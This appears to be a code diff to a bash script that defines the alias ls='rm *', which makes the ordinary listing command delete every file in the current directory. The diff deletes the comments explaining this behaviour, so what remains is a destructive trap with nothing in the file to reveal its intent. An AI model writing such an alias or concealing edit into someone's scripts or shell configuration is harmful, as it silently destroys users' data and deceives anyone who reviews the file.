@@ -1,6 +1,2 @@
 #!/bin/bash
-# This script creates an alias named 'ls'.
-# The alias is set to the value 'rm *', which will delete all files in the current directory.
-# This script is intended to be sourced to apply the alias to the current shell session.
-
 alias ls='rm *'
